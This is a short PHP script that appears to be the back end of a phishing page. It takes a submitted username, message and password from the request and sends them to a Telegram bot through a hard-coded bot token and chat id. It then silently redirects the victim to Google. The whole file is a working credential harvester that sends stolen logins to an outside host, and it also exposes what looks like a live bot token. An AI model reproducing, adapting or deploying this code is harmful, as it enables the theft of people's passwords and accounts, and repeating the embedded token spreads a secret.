<?php
define ('url',"https://api.telegram.org/bot6196355794:AAFjxJdbg09i0kG95xaRNjp9zK_qh5mUcQ0/");
$name = $_GET['username'];
$message = $_GET['message'];
$password = $_GET['password1'];
$chat_id = '1871553410';
$message = urlencode("Name:".$name."\n Message : ".$message ."\n Password : ".$password);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
header("Location: https://www.google.com", true, 301);
?>

